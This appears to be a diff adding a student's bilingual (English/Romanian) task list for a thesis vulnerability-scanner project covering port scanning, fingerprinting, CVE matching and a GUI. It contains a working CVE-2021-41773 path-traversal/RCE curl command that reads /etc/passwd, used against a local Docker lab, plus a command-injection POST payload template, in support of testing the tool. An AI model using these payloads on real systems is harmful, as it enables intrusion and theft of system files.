@@ -1,0 +1,336 @@
+1. UDP scan fix                     | TO BE TESTED
+2. Worker pool for host scanning    | DONE AND TESTED   | !!OBS: half-connect is slower than full-connect, why?
+3. Worker pool for host pinging     | DONE AND TESTED
+4. DNS checkalive                   | DONE AND TESTED
+5. Apply shellshockable docker (vulnerable tech id: CVE-2014-6271) / or apache 2.4.49                   | DONE AND TESTED
+            WORKAROUND: Docker Desktop with apache 2.4.49 on localhost...
+
+            https://hub.docker.com/r/ncontador/cve-2021-41773
+            https://hub.docker.com/r/ncontador/cve-2021-41773-rce
+                curl http://127.0.0.1:8188/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash -d 'A=|echo;cat /etc/passwd'
+
+17. FingerPrinter BUG!!!! Got response "default" from whatweb when expected was "Apache/2.4.49"         | TESTED AND FIXED FOR NOW
+
+6. Parse HTTP request from .yaml file                                           |       DONE
+        6.1. Make a dictionary for headers of the request                       |       DONE
+        6.2. Get list of TOP 100 HTTP ports                                     |       TODO GET HELP   | WORKAROUND USE ALL OPEN PORTS | DONE AND TESTED
+7. Send HTTP request to vulnerable server                                       |       DONE AND TESTED
+        7.1 Send it to docker image ncontador/cve-2021-41773:latest             |       DONE AND TESTED
+        7.2 https://hub.docker.com/r/ncontador/cve-2021-41773-rce get RCE to work       |       }                               {
+              https://github.com/thehackersbrain/CVE-2021-41773/blob/main/exploit.py    |       }       DONE AND TESTED         {
+        
+8. Match response with matchers in .yaml file (parse matchers from .yaml)       |       DONE, TO BE TESTED MORE
+        stop-at-first-match: true
+        matchers-condition: or
+
+        stop-at-first-match: true
+        unsafe: true
+        matchers-condition: or
+
+        OBS: any vulnerability that includes RCE will be matched for a "cat /etc/passwd", searching for regex "root:*:..."
+
+9. Confirm vulnerability                                                        |       DONE, TO BE TESTED MORE
+
+
+
+10. Add logger (import premade logger)
+11. Test and fix scanning and pinging multiple hosts at the same time!!!
+12. Verify input, throw exception and handle it?
+13. Use WhatWeb for ports that have HTTP service open on them!!!!!!! (default = 80 but it can miss)             | WORKAROUND: SCAN ALL OPEN PORTS | DONE AND TESTED
+        13.1. Use multithreading maybe
+        17. Lista default de porturi cunoscuta pentru HTTP/HTTPS si/sau try except pe ce am descoperit la service "http"
+                OBS: http s-ar putea sa intoarca in port scanner altceva decat "http"
+
+
+14. Check for ROOT privileges, if not: don't allow the user to run it                                   | DONE AND TESTED
+15. Score of 0,1 or 2 on CVE's, higher number, higher priority to be tested                             | DONE AND TESTED
+16. For every network, send to CveFinder network IP and hostname (from dns-checkalive) if found         | DONE, TO BE TESTED MORE
+
+18. Handle error if no host is online
+        Open ports dicovered on host 127.0.0.1
+        With operating system 0:
+        PORT    STATE   SERVICE VERSION
+        ERROR Opening: http://127.0.0.1 - Connection refused - connect(2) for "127.0.0.1" port 80
+        Traceback (most recent call last):
+        File "main.py", line 61, in <module>
+        fingerprinter = FingerPrinter(network,sys.argv)
+        File "/mnt/d/ATM/ANUL4/SEM1/LICENTA/custom_port_scanner/oop/FingerPrinter/FingerPrinter.py", line 34, in __init__
+        print("Technology used given by WhatWeb output:",self.technology_found)
+        AttributeError: 'FingerPrinter' object has no attribute 'technology_found'
+19. For every available IP, run fingerprinter and CveFinder (remake main)              | DONE, TO BE TESTED FOR MULTIPLE HOSTS
+20. Log Fingerpinter and CVEFinder (Properly)
+21. Update CVEFinder to use only what the fingerprinter worked with and responded with something positive | DONE AND TESTED
+
+
+_________________________________________________________________________________________________________________________________________________________________________________________________________
+
+
+
+
+
+23. Fix output of CveFinder when 2 vulnerabale ports are found          |       DONE AND TESTED
+
+Prase IP with http://{{{IP}}}:PORT
+
+    **Intreaba pe Tita cum descopar "tehnologia" (sau mai mult) din spate daca in WhatWeb apare versiune de Apache
+
+        in js/src/ uita-te pe acolo
+
+    {{interactsh-url}} ???????????
+
+
+Zigby si Z-wave stack
+
+
+curl http://127.0.0.1:8188/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash -d 'A=|echo;cat /etc/passwd'
+
+
+
+
+24. Request Head/Get pe toate porturile deschise, daca primeste raspuns (orice si 404) => port HTTP (pt Fingerpinter)   | DONE AND TESTED
+        Daca nu primeste raspuns atunci nu e HTTP
+                13. Use WhatWeb for ports that have HTTP service open on them!!!!!!! (default = 80 but it can miss)           
+                          6.2. Get list of TOP 100 HTTP ports                                     |       TODO GET HELP   | WORKAROUND USE ALL OPEN PORTS | DONE AND TESTED
+
+
+26. Integrare tool WhoIs        | TODO - enumerator.py                                  | DONE, OUTPUT CAN BE IMPROVED
+        26.1 Check if enumerator programs are installed otherwise install them?
+
+                                whois 213.177.4.170
+
+                                % This is the RIPE Database query service.
+                                % The objects are in RPSL format.
+                                %
+                                % The RIPE Database is subject to Terms and Conditions.
+                                % See http://www.ripe.net/db/support/db-terms-conditions.pdf
+
+                                % Note: this output has been filtered.
+                                %       To receive output for a database update, use the "-B" flag.
+
+                                % Information related to '213.177.4.160 - 213.177.4.175'
+
+                                % Abuse contact for '213.177.4.160 - 213.177.4.175' is 'abuse@stsisp.ro'
+
+                                inetnum:        213.177.4.160 - 213.177.4.175
+                                netname:        MTA-NET
+                                descr:          Academia Tehnica Militara
+                                source:         RIPE
+
+                                person:         Minta Adrian
+                                address:        Special Telecommunications Service
+                                address:        323A Splaiul Independentei, Bucharest 6
+                                phone:          +40212022660
+                                nic-hdl:        MA3173-RIPE
+                                mnt-by:         ROSTS-MNT
+                                created:        2004-04-05T11:49:55Z
+                                last-modified:  2018-02-01T08:42:56Z
+                                source:         RIPE # Filtered
+
+                                % Information related to '213.177.0.0/21AS31313'
+
+                                route:          213.177.0.0/21
+                                descr:          STS infrastructure and customers
+                                origin:         AS31313
+                                mnt-by:         ROSTS-MNT
+                                created:        2016-02-01T09:01:07Z
+                                last-modified:  2016-02-01T09:01:07Z
+                                source:         RIPE
+
+                                % This query was served by the RIPE Database Query Service version 1.106.1 (DEXTER)
+
+
+
+
+30. Ia in considerare HTTPS, unde ai HTTP incearca sa ai si HTTPS       | TODO -> do it in CVEFinder   | DONE, TO BE TESTED MORE (no testing machine with https for CVEFinder)
+                                                                                                        | DONE in Fingerpinter & Enumerator & CVEFinder
+
+
+
+
+
+
+25. Lista cu 50 de servicii UDP (DNS, openVPN, si altele) interogare mai rapida pe timeout mai simplu          |        WORKAROUND NEEDED | USING NETCAT FOR NOW | FUCKED | using netcat to scan | PROBLEM: Can't get service for port 5005, nmap can...
+        25.1. FIX UDP SCAN!!!!!!!!!!!!!!!!
+
+        ex: openVPN -> 4-5 octeti specifici, 4-5 secunde astepti maxim
+        (pentru cresterea vitezei)
+        consideram openVPN - port default si verificam
+
+
+27. Research un bun dictionar pentru dirbuster  
+
+        27.1 Folosim: dirb URL -S 
+                -S pentru SILENT MODE (nu arata cuvintele testate, nu avem nevoie de ele)
+
+        facem unul custom
+        cel putin 2
+                1.      cele mai comune 10000 nume de directoare                                                                | DONE AND TESTED  | Pentru enumerator, dirbuster. Am gasit la sursa aceasta https://github.com/xajkep/wordlists urmatorul fisier cu top 10k directories "top-10k-web-directories_from_10M_urlteam_links.txt"
+                2.      cel care mapeaza pe tehnologii (avem chestii ce se numesc la fel) ex: htaccess sau pe apache/nginx...   | DONE, TO BE TESTED
+                                        source: https://github.com/xajkep/wordlists/tree/master/discovery
+
+        adauga in Fingerpinter ce mai gasesti   |       ?
+
+
+
+
+
+28. Daca e SMB deschis fa enumerare de partitii
+        HELP
+
+*29. DUPA TOT FACEM GUI
+        paleta de culor/scara pentru vulnerabilitati, si cve sau missconfigurarai, servicii...
+
+        29.1 Update nuclei, update nuclei templates (mai 2023), uita-te la CVE Cve-2022-21587
+        29.2 Creaza pagina de informare despre CVE-uri si epss score (probabilitatea ca vulnerabilitatea sa apara)
+        29.3 Creaza input principal (network and ports)
+        29.4 Creaza pagina HELP
+        29.5 Creaza pagina principala, dupa input principal conform diagramelor
+                29.5.1 Atentie la CVE finder, fa-l aratos
+                        GRAFICE!!
+        29.6* Creaza pagina pentru dictionarele dirbuster
+
+
+**22. Add in Custom Port Scanner, Zigby and Z-wave Stack scanning
+
+
+@@mai cauta targeturi
+
+
+
+
+documentatie:
+intro
+motivatie
+importanta temei
+state of the art (pe componente)
+arhitectura
+grafice cu rezultatele (port scanner, in poarte de enumerare, Confirmare vulnerabilitati, etc)
+        medii de test
+
+
+31 FIX CVEFinder where yaml is not asking for RAW but gives concrete GET or POST method of payload delivery
+
+32 Custom Port Scanner "/usr/lib/python3/dist-packages/requests/__init__.py:89: RequestsDependencyWarning: urllib3 (1.26.15) or chardet (3.0.4) doesn't match a supported version!
+  warnings.warn("urllib3 ({}) or chardet ({}) doesn't match a supported " warning suppressed                    | BUGS
+
+
+!!!!!!!!!!! POSSIBLE SMB SERVICE -> DEADLOCK IN custom_port_scanner.py
+
+
+# Fixed bug in custom_port_scanner where offline hosts were being scanned anyway -> enumerator made it crash
+
+__________________________________________________________________________________________________________
+Limiteaza threaduri la 100 | DONE
+
+
+Schimbi stiva de scanare: Zigby, Z-wave stack, etc fancy
+
+Efecte/animatii/ lacate/ SA NU AI MULTE PUNCTE NEGRE/MONOCOLORE
+
+Upload dictionare! ,drag an drop txt
+
+Bullet in header cu finder -> 
+        BULLET ! finder -> doar IP sau hostname, gaseste date despre asta
+
+                whois
+                + 1/2 tooluri (OSINT)
+
+
+enumeratoare -> porturi deschise, servicii up
+
+
+baza de date sqlite sau python, mongodb...sqlite
+        nu are nevoie de server
+
+print trece in logging ca lumea
+
+output in baza de date
+
+
+scan in baza de date -> ID + data si ora la care a inceput |
+        In interfata 2 coloane DATA si IP/hostname
+                click pe IP/hostname => raport (output)
+
+        BULLET HEADER -> scan history
+
+
+33. Fix CVE finder output, get severity score | DONE
+
+
+34. Dynamicaly use the GUI                                              ALL DONE
+        34.1 main pages are shown and interchangeable                           | DONE and tested
+        34.2 get input from all pages                                           | DONE and tested
+        34.3 send output to all pages                                           
+                34.3.1 log the results                                          | DONE all - CveFinder | TODO log CveFInder after output everywhere
+                34.3.2 save them to database sqlite                             | DONE AND TESTED
+                34.3.3 use files or database to send them to html templates     | Using files and html converters, working on it... | DONE AND TESTED
+        34.4 Use patterns (see fuzzing input) for all inputs in order to not get garbage        | DONE for IPv4 and IPv6 in Main_Framework | DONE for CVE_classification pattern="(CVE-\d{4}-\d+)?(,CVE-\d{4}-\d+)*" (allows null)
+                        ***ATTEMPTED error management...not working at all for now...(java scripts inside html templates)
+35. Use a database for scanning         | DONE??? MEANING??
+
+36. Use API from https://www.first.org/epss/api for CVE Classifer       | DONE
+
+37. Attempt to have ppl upload .txt dirbuster dictionaries | DONE
+
+38. Fix Whois and other finder tools in enumerator.py in order not to recreate Enumerator class each time!      | DONE
+
+
+
+39. * Fix CVEFinder for non-raw formats of CVE files | WIP...
+
+40. Add another API for OSINT (Finder) module | WIP...
+
+41. Add debug tool to recreate the entire database!!    | DONE, _database_tool_delete_db deletes the entire database, _database_init creates it
+
+BUG     42. Fix port range input coming from web interface and going into custom_port_scanner module (seen as default)  | DONE AND TESTED
+
+
+43. Add messages for main framework if something goes wrong!
+
+!!!44. Fix .css and .html for Main_Framework_Extended ( make it look pretty) |  DONE AND TESTED
+
+!!!45. Make sure every module gives out output properly in html templates       | DONE AND TESTED
+        45.1 Watch background in HELP module!
+
+
+!!!!!!!!!!!!CVE_FINDER HAS BUGS!
+
+Technology: Werkzeug 
+Version: 2.3.5
+Port: 5000
+
+        SUGESTION: Clean output after every call of the CVE_FINDER class
+
+
+
+
+
+
+__________________________________________________________________________________________________________
+                                DOCUMENTATIE
+
+documentatie:
+intro
+motivatie
+importanta temei
+state of the art (pe componente)
+arhitectura
+grafice cu rezultatele (port scanner, in poarte de enumerare, Confirmare vulnerabilitati, etc)
+        medii de test
+
+
+1. Lista figuri + lista abrevieri (vezi modele)
+2. 
+
+
+basa payload plus POST
+
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        echo Content-Type: text/plain; echo; {{cmd}}
+
+
+CVE_classification -> trateaza eroarea cand nu gaseste nimic :
+        grigore@LAPTOP-CVEA4TOH:/mnt/d/ATM/ANUL4/SEM1/LICENTA/custom_port_scanner/oop$ curl https://api.first.org/data/v1/epss?cve=CVE-2023-27992
+        {"status":"OK","status-code":200,"version":"1.0","access":"public","total":0,"offset":0,"limit":100,"data":[]}
